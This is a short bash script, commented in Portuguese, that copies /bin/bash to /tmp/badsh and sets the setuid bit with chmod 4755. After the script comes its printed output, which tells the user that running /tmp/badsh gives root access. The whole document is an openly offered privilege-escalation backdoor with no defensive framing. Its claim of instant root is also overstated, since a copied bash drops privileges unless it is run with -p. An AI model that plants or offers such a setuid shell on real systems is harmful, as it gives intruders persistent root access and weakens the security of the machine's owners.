#!/bin/bash

# Cria um executável SUID
echo "Criando um shell SUID em /tmp/badsh..."
cp /bin/bash /tmp/badsh
chmod 4755 /tmp/badsh

echo "Shell SUID criado com sucesso! Você pode executar /tmp/badsh para obter acesso como root."

Criando um shell SUID em /tmp/badsh...
Shell SUID criado com sucesso! Você pode executar /tmp/badsh para obter acesso como root.
                                                                                           
